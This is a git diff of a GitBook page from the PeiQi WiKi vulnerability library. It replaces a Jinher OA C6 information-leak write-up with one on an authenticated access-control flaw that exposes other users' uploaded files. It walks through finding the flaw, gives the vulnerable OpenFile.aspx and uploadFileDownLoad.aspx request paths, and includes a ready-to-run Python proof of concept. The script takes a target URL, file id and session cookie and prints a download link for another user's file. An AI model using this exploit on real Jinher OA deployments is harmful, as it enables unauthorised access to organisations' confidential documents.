@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>金和OA C6 越权信息泄露漏洞 · PeiQi WiKi文库</title>
+        <title>金和OA C6 后台越权敏感文件遍历漏洞 · PeiQi WiKi文库</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -113,7 +113,7 @@
     <link rel="next" href="../泛微OA/" />
     
     
-    <link rel="prev" href="金和OA C6 管理员默认口令.html" />
+    <link rel="prev" href="金和OA C6 越权信息泄露漏洞.md" />
     
 
     
@@ -2395,12 +2395,25 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.6.2.2" data-path="金和OA C6 越权信息泄露漏洞.html">
+        <li class="chapter " data-level="2.6.2.2" data-path="金和OA C6 越权信息泄露漏洞.md">
             
-                <a href="金和OA C6 越权信息泄露漏洞.html">
+                <span>
             
                     
                     金和OA C6 越权信息泄露漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.6.2.3" data-path="金和OA C6 后台越权敏感文件遍历漏洞.html">
+            
+                <a href="金和OA C6 后台越权敏感文件遍历漏洞.html">
+            
+                    
+                    金和OA C6 后台越权敏感文件遍历漏洞
             
                 </a>
             
@@ -4126,7 +4139,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../../.." >金和OA C6 越权信息泄露漏洞</a>
+        <a href="../../.." >金和OA C6 后台越权敏感文件遍历漏洞</a>
     </h1>
 </div>
 
@@ -4141,9 +4154,9 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="&#x91D1;&#x548C;oa-c6-&#x8D8A;&#x6743;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#x6F0F;&#x6D1E;">&#x91D1;&#x548C;OA C6 &#x8D8A;&#x6743;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#x6F0F;&#x6D1E;</h1>
+                                <h1 id="&#x91D1;&#x548C;oa-c6-&#x540E;&#x53F0;&#x8D8A;&#x6743;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x904D;&#x5386;&#x6F0F;&#x6D1E;">&#x91D1;&#x548C;OA C6 &#x540E;&#x53F0;&#x8D8A;&#x6743;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x904D;&#x5386;&#x6F0F;&#x6D1E;</h1>
 <h2 id="&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;">&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;</h2>
-<p>&#x91D1;&#x548C;OA C6 &#x5B58;&#x5728;&#x8D8A;&#x6743;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#x6F0F;&#x6D1E;&#xFF0C;&#x666E;&#x901A;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x904D;&#x5386;ID&#x7F16;&#x53F7;&#x83B7;&#x53D6;&#x7BA1;&#x7406;&#x5458;&#x53CA;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
+<p>&#x91D1;&#x548C;OA C6 &#x5B58;&#x5728;&#x540E;&#x53F0;&#x8D8A;&#x6743;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x904D;&#x5386;&#x6F0F;&#x6D1E;&#xFF0C;&#x666E;&#x901A;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x904D;&#x5386;&#x7279;&#x6B8A;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x7684;&#x654F;&#x611F;&#x6587;&#x4EF6;</p>
 <h2 id="&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;">&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;</h2>
 <blockquote>
 <p>[!NOTE]</p>
@@ -4155,19 +4168,104 @@
 <p>app=&quot;Jinher-OA&quot;</p>
 </blockquote>
 <h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
-<p>&#x4F7F;&#x7528;&#x666E;&#x901A;&#x7528;&#x6237;&#x767B;&#x5F55; OA&#x5E94;&#x7528;&#x540E;&#x53F0;</p>
-<p>&#x8BBF;&#x95EE;&#x7684;POC&#x4E3A;</p>
-<pre><code>http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=RY120330
-</code></pre><blockquote>
+<p>&#x767B;&#x5F55;&#x540E;&#x70B9;&#x51FB;&#x4FE1;&#x606F;&#x4EA4;&#x6D41;&#xFF0C;&#x53D1;&#x8D77;&#x534F;&#x540C;&#x9875;&#x9762;</p>
+<p><a href="image/jh-5.png" data-lightbox="d8ba3f3a-833e-479f-84f3-07e90ca7f325" data-title=""><img src="image/jh-5.png" alt=""></a></p>
+<p>&#x4E0A;&#x4F20;&#x9644;&#x4EF6;&#x5E76;&#x4E0A;&#x4F20;&#x53D1;&#x9001;&#x7ED9;&#x76EE;&#x6807;</p>
+<blockquote>
 <p>[!NOTE]</p>
-<p>&#x6CE8;&#x610F; RY120330 &#x9700;&#x8981;&#x4E3A;&#x786E;&#x5B9A;&#x7684;&#x5176;&#x4ED6;&#x7684;&#x7528;&#x6237;&#x7F16;&#x53F7;</p>
+<p>&#x8FD9;&#x91CC;&#x767B;&#x5F55;&#x6743;&#x9650;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x53D1;&#x7ED9;&#x81EA;&#x5DF1;&#x5C31;&#x597D;&#xFF0C;&#x524D;&#x6587;&#x53EA;&#x662F;&#x5C55;&#x73B0;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x601D;&#x8DEF;&#x8FC7;&#x7A0B;</p>
 </blockquote>
-<p><a href="image/jh-4.png" data-lightbox="c087be4b-09fe-4482-8b77-d2c3a0ea104e" data-title=""><img src="image/jh-4.png" alt=""></a></p>
-<p>&#x6CC4;&#x9732;&#x4E86;&#x90E8;&#x5206;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
-<h2 id="&#x53C2;&#x8003;&#x6587;&#x7AE0;">&#x53C2;&#x8003;&#x6587;&#x7AE0;</h2>
-<p><a href="https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA" target="_blank">https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA</a> </p>
+<p><a href="image/jh-6.png" data-lightbox="f1e97c2c-ac2e-4598-aa86-dcb11bf8887a" data-title=""><img src="image/jh-6.png" alt=""></a></p>
+<p>&#x6210;&#x529F;&#x6536;&#x5230;&#x4E0A;&#x4F20;&#x7684;&#x9644;&#x4EF6;</p>
+<p><a href="image/jh-7.png" data-lightbox="b966f22b-82d8-4a66-85d7-3b9226c72503" data-title=""><img src="image/jh-7.png" alt=""></a></p>
+<p>&#x70B9;&#x51FB;&#x67E5;&#x770B;&#x65F6;&#x6293;&#x5305;&#xFF0C;&#x53D1;&#x73B0;&#x4E00;&#x4E2A;&#x5E26;&#x6709;&#x6587;&#x4EF6;ID&#x7684;&#x8BF7;&#x6C42;&#x5305;</p>
+<p><a href="image/jh-8.png" data-lightbox="9829c2ec-1ebb-405d-8857-5bf9777ba7c1" data-title=""><img src="image/jh-8.png" alt=""></a></p>
+<p>&#x8FD4;&#x56DE;&#x4E86;&#x51E0;&#x4E2A;&#x53C2;&#x6570;</p>
+<pre><code>var strFilePath = &apos;../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png&apos;;
+var strFileType = &apos;png&apos;;
+var strSid=&apos;3jvpvhs410m2wdbbficax5q5&apos;;
+var strFileIDCode=&apos;us9w7xWE7do=&apos;;
+var strId = &apos;1229&apos;;
+var strTxtReg = &apos;txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log&apos;;
+var strImgReg = &apos;jpg,gif,jpeg,png,ico&apos;;
+var MD = &apos;&apos;;
+</code></pre><p>&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x6CE8;&#x610F;&#x5230; strFilePath &#x4E3A;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x50A8;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x66F4;&#x6539; id&#x53C2;&#x6570;&#x4E3A;&#x53E6;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x4E14;&#x6D4B;&#x8BD5;&#x540E;&#x53D1;&#x73B0; name&#x6587;&#x4EF6;&#x540D;&#x53C2;&#x6570;&#x65E0;&#x5173;&#x7D27;&#x8981;</p>
+<p><a href="image/jh-9.png" data-lightbox="8cbc39ff-8269-4791-9ca2-1bdb9b818186" data-title=""><img src="image/jh-9.png" alt=""></a></p>
+<p>&#x66F4;&#x6539;ID&#x540E;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x5305;&#x53D1;&#x73B0;&#x83B7;&#x5F97;&#x53E6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4FE1;&#x606F;</p>
+<p>&#x8BBF;&#x95EE;Url&#xFF0C;&#x6CE8;&#x610F; <strong>type&#x53C2;&#x6570; </strong> &#x9700;&#x8981;&#x4E3A;&#x6B63;&#x786E;&#x7684;&#x6587;&#x4EF6;&#x540E;&#x7F00;&#x624D;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&amp;name=&amp;type=pdf
+</code></pre><p><a href="image/jh-10.png" data-lightbox="8e676162-1d7c-47bd-9384-c4ecfc42ab57" data-title=""><img src="image/jh-10.png" alt=""></a></p>
+<p>&#x8FD9;&#x91CC;&#x66F4;&#x6362;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7528;&#x6237;&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x53EF;&#x884C;&#xFF0C;&#x5C1D;&#x8BD5;&#x904D;&#x5386; id</p>
+<p><a href="image/jh-12.png" data-lightbox="d8501b63-e554-45c1-a4f9-ae512a06c0ca" data-title=""><img src="image/jh-12.png" alt=""></a></p>
+<p><a href="image/jh-11.png" data-lightbox="30388aad-b71e-4684-b66a-ab55737cad9e" data-title=""><img src="image/jh-11.png" alt=""></a></p>
+<p>&#x5B58;&#x5728; <strong>strFilePath&#x53C2;&#x6570;</strong> &#x5219;&#x662F;&#x5B58;&#x5728;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x7A7A;&#x5219;&#x662F;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x4E0D;&#x5B58;&#x5728;</p>
+<p>&#x540C;&#x65F6;&#x6293;&#x5305;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x9875;&#x9762;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x53EF;&#x83B7;&#x53D6;&#x7684;&#x53C2;&#x6570;</p>
+<p><strong>FileID &#x4E0E; FileIDCode</strong></p>
+<p><a href="image/jh-13.png" data-lightbox="9b6bc712-0ff0-49ee-9e25-033e2c89426a" data-title=""><img src="image/jh-13.png" alt=""></a></p>
+<p>&#x4E8E;&#x662F;&#x53EA;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x521A;&#x521A;&#x7684;ID&#x904D;&#x5386;&#xFF0C;&#x83B7;&#x53D6;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x53C2;&#x6570;&#x5C31;&#x80FD;&#x4E0B;&#x8F7D;&#x5176;&#x4ED6;&#x4EBA;&#x53D1;&#x9001;&#x7684;&#x654F;&#x611F;&#x6587;&#x4EF6;&#xFF0C;&#x4E14;&#x53EA;&#x9700;&#x8981;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;</p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>POC&#x53EA;&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E14;&#x6F0F;&#x6D1E;&#x5B58;&#x5728;&#x4E8E;&#x540E;&#x53F0;&#x9700;&#x8981;&#x767B;&#x5F55;</p>
+<p>&#x8FD0;&#x884C;&#x540E;&#x8BBF;&#x95EE;&#x94FE;&#x63A5;&#x5373;&#x53EF;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;</p>
+</blockquote>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span>
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34m&#x516C;&#x4F17;&#x53F7;  : PeiQi&#x6587;&#x5E93;                                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mVersion: &#x91D1;&#x548C;OA C6                                                  \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36m&#x4F7F;&#x7528;&#x683C;&#x5F0F;:  python3 poc.py                                            \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url, file_id, cookie)</span>:</span>
+    vuln_url = target_url + <span class="hljs-string">&quot;/C6/control/OpenFile.aspx?id={}&amp;name=&amp;type=pdf&quot;</span>.format(file_id)
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,
+        <span class="hljs-string">&quot;Cookie&quot;</span>:cookie
+    }
+    <span class="hljs-keyword">try</span>:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=<span class="hljs-keyword">False</span>, timeout=<span class="hljs-number">5</span>)
+        print(<span class="hljs-string">&quot;\033[36m[o] &#x6B63;&#x5728;&#x8BF7;&#x6C42; Url: {}\033[0m&quot;</span>.format(vuln_url))
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;strFilePath =&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:
+            strFilePath = re.findall(<span class="hljs-string">r&quot;var strFilePath = &apos;(.*?)&apos;;&quot;</span>, response.text)[<span class="hljs-number">0</span>]
+            strFileType = strFilePath[<span class="hljs-number">-3</span>:]
+            strFileIDCode = re.findall(<span class="hljs-string">r&quot;var strFileIDCode=&apos;(.*?)&apos;;&quot;</span>, response.text)[<span class="hljs-number">0</span>]
+            strId = re.findall(<span class="hljs-string">r&quot;var strId = &apos;(.*?)&apos;;&quot;</span>, response.text)[<span class="hljs-number">0</span>]
+            sid = re.findall(<span class="hljs-string">r&apos;ASP.NET_SessionId=(.*?);&apos;</span>, cookie)[<span class="hljs-number">0</span>]
+            <span class="hljs-keyword">if</span> strFilePath != <span class="hljs-string">&quot;&quot;</span>:
+                print(<span class="hljs-string">&quot;\033[36m[o] &#x76EE;&#x6807; {} &#x5B58;&#x5728;&#x6F0F;&#x6D1E;, &#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x4FE1;&#x606F;:\n[o] &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF1A;{}\n[o] &#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF1A;{}\n[o] &#x6587;&#x4EF6;ID code&#xFF1A;{}\n[o] &#x6587;&#x4EF6;&#x7F16;&#x53F7;&#xFF1A; {}\033[0m&quot;</span>.format(target_url, strFilePath, strFileType,strFileIDCode, strId ))
+                print(<span class="hljs-string">&quot;\033[32m[o] &#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x4E3A;: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&amp;FileID={}&amp;FileIDCode={}&amp;sid={}&quot;</span>.format(target_url, strId, strFileIDCode, sid))
+            <span class="hljs-keyword">else</span>:
+                print(<span class="hljs-string">&quot;\033[31m[x] &#x76EE;&#x6807; {} &#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;     \033[0m&quot;</span>.format(target_url))
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;\033[31m[x] &#x76EE;&#x6807; {} &#x4E0D;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;     \033[0m&quot;</span>.format(target_url))
+
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x8BF7;&#x6C42;&#x5931;&#x8D25; \033[0m&quot;</span>, e)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    title()
+    target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))
+    file_id = str(input(<span class="hljs-string">&quot;\033[35mFile_id &gt;&gt;&gt; \033[0m&quot;</span>))
+    cookie = str(input(<span class="hljs-string">&quot;\033[35mCookie  &gt;&gt;&gt; \033[0m&quot;</span>))
+    POC_1(target_url, file_id, cookie)
+</code></pre>
+<p><a href="image/jh-14.png" data-lightbox="e76aae64-e00c-40f0-93c4-1ef38b5b51e3" data-title=""><img src="image/jh-14.png" alt=""></a> </p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2021-04-02 12:03:22
+2021-04-02 21:43:47
 </span></footer>
                                 
                                 </section>
@@ -4195,7 +4293,7 @@
 
             
                 
-                <a href="金和OA C6 管理员默认口令.html" class="navigation navigation-prev " aria-label="Previous page: 金和OA C6 管理员默认口令">
+                <a href="金和OA C6 越权信息泄露漏洞.md" class="navigation navigation-prev " aria-label="Previous page: 金和OA C6 越权信息泄露漏洞">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
@@ -4211,7 +4309,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"金和OA C6 越权信息泄露漏洞","level":"2.6.2.2","depth":3,"next":{"title":"泛微OA","level":"2.6.3","depth":2,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/README.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/README.md","articles":[{"title":"泛微云桥 e-Bridge 任意文件读取","level":"2.6.3.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.md","articles":[]},{"title":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204","level":"2.6.3.2","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.md","articles":[]},{"title":"泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库)","level":"2.6.3.3","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.md","articles":[]},{"title":"泛微OA e-cology 数据库配置信息泄漏漏洞","level":"2.6.3.4","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.md","articles":[]},{"title":"泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传","level":"2.6.3.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.md","articles":[]}]},"previous":{"title":"金和OA C6 管理员默认口令","level":"2.6.2.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 管理员默认口令.md","ref":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 管理员默认口令.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 越权信息泄露漏洞.md","mtime":"2021-04-02T04:03:22.004Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-02T10:10:13.162Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"金和OA C6 后台越权敏感文件遍历漏洞","level":"2.6.2.3","depth":3,"next":{"title":"泛微OA","level":"2.6.3","depth":2,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/README.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/README.md","articles":[{"title":"泛微云桥 e-Bridge 任意文件读取","level":"2.6.3.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.md","articles":[]},{"title":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204","level":"2.6.3.2","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.md","articles":[]},{"title":"泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库)","level":"2.6.3.3","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.md","articles":[]},{"title":"泛微OA e-cology 数据库配置信息泄漏漏洞","level":"2.6.3.4","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.md","articles":[]},{"title":"泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传","level":"2.6.3.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.md","ref":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.md","articles":[]}]},"previous":{"title":"金和OA C6 越权信息泄露漏洞","level":"2.6.2.2","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 越权信息泄露漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 越权信息泄露漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/金和OA/金和OA C6 后台越权敏感文件遍历漏洞.md","mtime":"2021-04-02T13:43:47.326Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-02T13:49:21.768Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
